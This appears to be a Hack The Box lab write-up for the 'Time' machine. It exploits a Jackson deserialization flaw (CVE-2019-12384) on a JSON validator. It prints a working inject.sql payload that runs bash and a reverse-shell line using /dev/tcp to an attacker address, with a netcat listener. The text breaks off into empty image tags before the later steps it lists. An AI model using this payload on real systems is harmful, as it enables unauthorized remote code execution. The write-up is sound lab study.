---
layout: page
title: Time
description: Write-up
dropdown: HTB-BOXES
priority: 2
---
# Time Walkthrough
![](https://i.ibb.co/pP4vK3F/image.png)



# []()Methodology

* Nmap scan.
* Web enumertation.
* Lua code injection vulnerability.
* Getting reverse shell.
* Enumerate luanne.
* Getting id_rsa for a user.
* ssh connecting.
* Privilege escalation.
* RooTed.

## Nmap Scan:

**I just found 22 for ssh and 80 for http web page**


![](https://i.ibb.co/rGkP8zJ/image.png)

### Let's start with the Web Page:

**It's an online JSON beautifier and validator.**

![](https://i.ibb.co/GWKXZz3/image.png)

> * I tried to find SQLi, But while i was fired up my Burp suit i found that interesting error. 

![](https://i.ibb.co/H77fsKh/image.png)

> **I searched google about (unhandled java exception com.fasterxml.jackson.core.jsonparseexception), After 15 minutes of search i realized that is a JSON deserialization, And i found a CVE-2019-12384, It's Famous about Jackson Rce For CVE-2019-12384.**


> **This [CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12384) allow attacker to get RCE, By FasterXML jackson-databind 2.x before 2.9.9.1 might allow attackers to have a variety of impacts by leveraging failure to block the logback-core class from polymorphic deserialization. Depending on the classpath content, remote code execution may be possible.**


##### Hackers logic if there is a CVE, Find its Exploit.

* I found this [Exploit](https://github.com/jas502n/CVE-2019-12384), But for some reason it didn't work with me.
* The i found [This](https://www.programmersought.com/article/77146841082/), I will use the RCE part with reverse shell.

> **In simple steps:**
1. Add inject.sql file to your machine.
2. Get ready your bash shell execution for the reverse shell [(CALL SHELLEXEC('bash -i &>/dev/tcp/YOUR_MACHINE_IP/YOUR_NC_LISTNER_PORT 0>&1 &'))].
3. Fired up your http server for port 8000 to upload inject.sql for our attacking box (Time).
4. Make your listner ready for the reverse shell.
5. Use the POC payload with YOUR_MACHINE_IP on port 8000.
6. BOOOM, you got reverse shell.

**inject.sql**
```ruby
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.16.11/1234 0>&1 &')
```
**Firing up our http server**

![](https://i.ibb.co/synM0x0/image.png)

**Netcat as our listner ```ruby nc -nlvp 1234 ```**
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
